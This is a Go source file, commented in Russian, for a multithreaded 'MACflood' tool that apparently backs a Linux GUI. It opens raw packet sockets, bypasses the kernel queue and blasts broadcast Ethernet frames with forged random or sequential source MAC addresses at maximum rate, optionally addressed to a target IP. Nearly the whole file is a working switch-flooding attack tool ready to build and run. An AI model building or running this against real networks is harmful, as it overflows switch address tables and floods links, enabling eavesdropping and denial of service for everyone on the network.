//go:build linux

// main.go
//
// MACflood для Gotcha Linux GUI.
//
// Аргументы совместимы с main.py:
//
//	MACflood <interface> <packets> <threads> <mac_mode> [target_ip]
//
// Пример:
//
//	MACflood eth0 0 8 flood
//
// Вывод для GUI и встроенного счётчика:
//
//	[Stats] Sent 12345 packets | total=12345 | speed=12345 pkt/s
//
// GUI парсит строку по маске:
//
//	Sent\s+(\d+)\s+packets
//
// Поэтому число после Sent — это дельта за последнюю секунду,
// чтобы интерфейс не задваивал статистику.
//
// Сборка:
//
//	go get golang.org/x/sys@latest
//	go mod tidy
//	go build -o bin/MACflood .
//
// Переменные окружения:
//
//	FRAME_LEN   размер Ethernet-кадра в байтах, по умолчанию 64
//	BATCH_SIZE  сколько пакетов отправлять за один sendmmsg, по умолчанию 64

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	ethHeaderLen      = 14
	packetQdiscBypass = 20 // PACKET_QDISC_BYPASS
)

var (
	runningFlag int32 = 1
	counters    []counterSlot
)

// counterSlot выравниваем, чтобы потоки меньше конфликтовали за кэш-линии.
type counterSlot struct {
	n int64
	_ [56]byte
}

// fastRand — быстрый генератор для MAC-адресов.
type fastRand struct {
	state uint64
}

func newFastRand(seed uint64) fastRand {
	if seed == 0 {
		seed = 0x9E3779B97F4A7C15
	}
	return fastRand{state: seed}
}

func (r *fastRand) next() uint64 {
	x := r.state
	x ^= x << 13
	x ^= x >> 7
	x ^= x << 17
	r.state = x
	return x
}

func isRunning() bool {
	return atomic.LoadInt32(&runningFlag) == 1
}

func htons(v uint16) uint16 {
	return (v<<8)&0xff00 | (v >> 8)
}

func randomMAC(mac []byte, r *fastRand) {
	v := r.next()

	mac[0] = byte(v)
	mac[1] = byte(v >> 8)
	mac[2] = byte(v >> 16)
	mac[3] = byte(v >> 24)
	mac[4] = byte(v >> 32)
	mac[5] = byte(v >> 40)

	// locally administered, unicast
	mac[0] = (mac[0] | 0x02) & 0xFE
}

func incrementMAC(mac []byte) {
	for i := 5; i >= 0; i-- {
		mac[i]++
		if mac[i] != 0 {
			break
		}
	}

	// locally administered, unicast
	mac[0] = (mac[0] | 0x02) & 0xFE
}

func parseMAC(s string) (net.HardwareAddr, bool) {
	switch s {
		case "random", "flood", "sequential":
			return nil, false
	}

	hw, err := net.ParseMAC(s)
	if err != nil || len(hw) != 6 {
		return nil, false
	}

	return hw, true
}

func sumCounters() int64 {
	var total int64
	for i := range counters {
		total += atomic.LoadInt64(&counters[i].n)
	}
	return total
}

// statsPrinter раз в секунду печатает счётчик.
//
// Формат специально совместим с GUI:
//
//	Sent <N> packets
//
// N — это дельта за последний интервал, а не общий итог.
func statsPrinter(stop chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	var last int64
	lastTime := time.Now()

	for {
		select {
		case <-stop:
			cur := sumCounters()
			now := time.Now()

			var speed int64
			elapsed := now.Sub(lastTime).Seconds()
			if elapsed > 0 {
				speed = int64(float64(cur-last) / elapsed)
			}

			delta := cur - last
			if delta < 0 {
				delta = 0
			}

			fmt.Printf("[Stats] Sent %d packets | total=%d | speed=%d pkt/s\n",
				   delta, cur, speed)
			return

		case <-ticker.C:
			cur := sumCounters()
			now := time.Now()

			var speed int64
			elapsed := now.Sub(lastTime).Seconds()
			if elapsed > 0 {
				speed = int64(float64(cur-last) / elapsed)
			}

			delta := cur - last
			if delta < 0 {
				delta = 0
			}

			fmt.Printf("[Stats] Sent %d packets | total=%d | speed=%d pkt/s\n",
				   delta, cur, speed)

			last = cur
			lastTime = now
		}
	}
}

func envInt(key string, def int) int {
	if s := os.Getenv(key); s != "" {
		if v, err := strconv.Atoi(s); err == nil {
			return v
		}
	}
	return def
}

func prepareIPHeader(frame []byte, dstIP uint32) {
	payload := frame[ethHeaderLen:]
	if len(payload) < 20 {
		return
	}

	for i := 0; i < 20; i++ {
		payload[i] = 0
	}

	payload[0] = 0x45 // IPv4, IHL=5

	binary.BigEndian.PutUint16(payload[2:4], uint16(len(payload)))
	binary.BigEndian.PutUint16(payload[4:6], 0x1234)

	payload[8] = 64 // TTL
	payload[9] = 17 // UDP

	// Статический source IP.
	// Для MAC-флуда содержимое пакета обычно не критично.
	binary.BigEndian.PutUint32(payload[12:16], 0x0A000001) // 10.0.0.1
	binary.BigEndian.PutUint32(payload[16:20], dstIP)
}

func initFrame(frame []byte, hasTarget bool, targetIP uint32) {
	frameLen := len(frame)

	// Destination MAC: broadcast
	for i := 0; i < 6; i++ {
		frame[i] = 0xFF
	}

	// Payload
	for i := ethHeaderLen; i < frameLen; i++ {
		frame[i] = 0xAA
	}

	// EtherType IPv4
	frame[12] = 0x08
	frame[13] = 0x00

	if hasTarget && frameLen >= ethHeaderLen+20 {
		prepareIPHeader(frame, targetIP)
	}
}

// mmsghdr соответствует struct mmsghdr из Linux.
type mmsghdr struct {
	Hdr unix.Msghdr
	Len uint32
}

// sendMmsg делает системный вызов sendmmsg напрямую,
// чтобы не зависеть от наличия обёртки в x/sys/unix.
func sendMmsg(fd int, msgs []mmsghdr, flags int) (int, error) {
	if len(msgs) == 0 {
		return 0, nil
	}

	n, _, errno := unix.Syscall6(
		uintptr(unix.SYS_SENDMMSG),
				     uintptr(fd),
				     uintptr(unsafe.Pointer(&msgs[0])),
				     uintptr(len(msgs)),
				     uintptr(flags),
				     0,
			      0,
	)

	runtime.KeepAlive(msgs)

	if errno != 0 {
		return int(n), errno
	}

	return int(n), nil
}

func floodThread(
	threadID int,
	iface string,
	packetCount int,
	mode string,
	staticMAC net.HardwareAddr,
	targetIP uint32,
	hasTarget bool,
	frameLen int,
	batchSize int,
	wg *sync.WaitGroup,
) {
	defer wg.Done()

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	ifi, err := net.InterfaceByName(iface)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[Thread %d] Interface error: %v\n", threadID, err)
		return
	}

	fd, err := unix.Socket(
		unix.AF_PACKET,
		unix.SOCK_RAW,
		int(htons(uint16(unix.ETH_P_ALL))),
	)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[Thread %d] Socket error: %v\n", threadID, err)
		return
	}
	defer unix.Close(fd)

	// Увеличиваем буфер отправки.
	_ = unix.SetsockoptInt(fd, unix.SOL_SOCKET, unix.SO_SNDBUF, 16<<20)

	// Обход qdisc. Если ядро не поддерживает — ошибка игнорируется.
	_ = unix.SetsockoptInt(fd, unix.SOL_PACKET, packetQdiscBypass, 1)

	sa := unix.RawSockaddrLinklayer{
		Family:   uint16(unix.AF_PACKET),
		Protocol: htons(uint16(unix.ETH_P_ALL)),
		Ifindex:  int32(ifi.Index),
		Hatype:   uint16(1), // ARPHRD_ETHER
		Pkttype:  uint8(0),
		Halen:    uint8(6),
	}

	for i := 0; i < 6; i++ {
		sa.Addr[i] = 0xFF
	}

	frames := make([][]byte, batchSize)
	iovecs := make([]unix.Iovec, batchSize)
	msgs := make([]mmsghdr, batchSize)

	for i := 0; i < batchSize; i++ {
		frames[i] = make([]byte, frameLen)
		initFrame(frames[i], hasTarget, targetIP)

		iovecs[i] = unix.Iovec{
			Base: &frames[i][0],
			Len:  uint64(frameLen),
		}

		msgs[i] = mmsghdr{
			Hdr: unix.Msghdr{
				Name:    (*byte)(unsafe.Pointer(&sa)),
				Namelen: uint32(unsafe.Sizeof(sa)),
				Iov:     &iovecs[i],
				Iovlen:  1,
			},
		}
	}

	rnd := newFastRand(uint64(time.Now().UnixNano()) ^ uint64(threadID+1)*0x9E3779B97F4A7C15)

	var seq [6]byte

	switch mode {
		case "static":
			for i := range frames {
				copy(frames[i][6:12], staticMAC)
			}
		case "sequential":
			randomMAC(seq[:], &rnd)
		default:
			// random / flood: MAC будет обновляться перед отправкой
	}

	fmt.Printf("[Thread %d] started on %s (mode=%s, frameLen=%d, batch=%d)\n",
		   threadID, iface, mode, frameLen, batchSize)

	var local int64
	limit := int64(packetCount)

	for {
		if limit != 0 && local >= limit {
			break
		}

		count := batchSize
		if limit != 0 && local+int64(count) > limit {
			count = int(limit - local)
		}

		switch mode {
			case "static":
				// MAC уже установлен во всех кадрах

			case "sequential":
				for i := 0; i < count; i++ {
					incrementMAC(seq[:])
					copy(frames[i][6:12], seq[:])
				}

			default: // random / flood
				for i := 0; i < count; i++ {
					randomMAC(frames[i][6:12], &rnd)
				}
		}

		n, err := sendMmsg(fd, msgs[:count], 0)
		if n > 0 {
			local += int64(n)
			atomic.AddInt64(&counters[threadID].n, int64(n))
		}

		if err != nil {
			if n == 0 {
				// Не крутим цикл вхолостую при ошибке.
				time.Sleep(time.Millisecond)
			}
		}

		if !isRunning() {
			break
		}

		runtime.KeepAlive(frames)
		runtime.KeepAlive(iovecs)
		runtime.KeepAlive(msgs)
		runtime.KeepAlive(&sa)
	}

	// Здесь специально не пишем "Sent ... packets",
	// чтобы GUI не просуммировал итог повторно.
	fmt.Printf("[Thread %d] done: %d frames\n", threadID, local)
}

func printUsage(prog string) {
	fmt.Printf("Usage: %s <interface> <packets> <threads> <mac_mode> [target_ip]\n", prog)
	fmt.Println("  packets:   Number of packets per thread (0 for infinite)")
	fmt.Println("  threads:   Number of parallel threads")
	fmt.Println("  mac_mode:  'random', 'flood', 'sequential' or static MAC")
	fmt.Println("  target_ip: Optional destination IP")
	fmt.Println()
	fmt.Println("Environment:")
	fmt.Println("  FRAME_LEN   Ethernet frame size in bytes")
	fmt.Println("              Default: 64")
	fmt.Println("              Original-like: FRAME_LEN=1514")
	fmt.Println()
	fmt.Println("  BATCH_SIZE  Packets per sendmmsg call")
	fmt.Println("              Default: 64")
	fmt.Println("              Try: 64, 128, 256, 512")
}

func main() {
	debug.SetGCPercent(-1)
	runtime.GOMAXPROCS(runtime.NumCPU())

	if len(os.Args) < 5 {
		printUsage(os.Args[0])
		os.Exit(1)
	}

	iface := os.Args[1]

	packetCount, err := strconv.Atoi(os.Args[2])
	if err != nil || packetCount < 0 {
		fmt.Fprintln(os.Stderr, "Invalid packet count")
		os.Exit(1)
	}

	threadCount, err := strconv.Atoi(os.Args[3])
	if err != nil || threadCount <= 0 || threadCount > 10000 {
		fmt.Fprintln(os.Stderr, "Invalid thread count")
		os.Exit(1)
	}

	macArg := os.Args[4]

	var targetIP uint32
	hasTarget := false

	if len(os.Args) >= 6 {
		if parsed := net.ParseIP(os.Args[5]); parsed != nil {
			if v4 := parsed.To4(); v4 != nil {
				targetIP = binary.BigEndian.Uint32(v4)
				hasTarget = true
				fmt.Printf("Target IP set to: %s\n", os.Args[5])
			}
		}
	}

	frameLen := envInt("FRAME_LEN", 64)
	if frameLen < 64 {
		frameLen = 64
	}
	if frameLen > 65535 {
		frameLen = 65535
	}

	if hasTarget && frameLen < ethHeaderLen+20 {
		frameLen = ethHeaderLen + 20
	}

	batchSize := envInt("BATCH_SIZE", 64)
	if batchSize < 1 {
		batchSize = 1
	}
	if batchSize > 4096 {
		batchSize = 4096
	}

	var mode string
	var staticMAC net.HardwareAddr

	switch macArg {
		case "random", "flood", "sequential":
			mode = macArg
			fmt.Printf("Mode: %s\n", macArg)
		default:
			hw, ok := parseMAC(macArg)
			if !ok {
				fmt.Fprintf(os.Stderr, "Invalid MAC address: %s\n", macArg)
				os.Exit(1)
			}
			staticMAC = hw
			mode = "static"
			fmt.Printf("Mode: Static MAC %s\n", macArg)
	}

	counters = make([]counterSlot, threadCount)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sig
		atomic.StoreInt32(&runningFlag, 0)
	}()

	fmt.Printf("Starting MAC Flood on %s with %d threads (frameLen=%d, batch=%d)...\n",
		   iface, threadCount, frameLen, batchSize)

	stopStats := make(chan struct{})
	var statsWg sync.WaitGroup
	statsWg.Add(1)
	go statsPrinter(stopStats, &statsWg)

	var wg sync.WaitGroup

	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go floodThread(
			i,
		 iface,
		 packetCount,
		 mode,
		 staticMAC,
		 targetIP,
		 hasTarget,
		 frameLen,
		 batchSize,
		 &wg,
		)
	}

	wg.Wait()

	close(stopStats)
	statsWg.Wait()

	// Эта строка не содержит "Sent ... packets", чтобы не дублировать счётчик.
	fmt.Printf("[Done] total frames=%d\n", sumCounters())

	// Эту строку GUI парсит отдельно:
	//
	//     if "Flood finished" in line:
	//
	fmt.Println("Flood finished.")
}
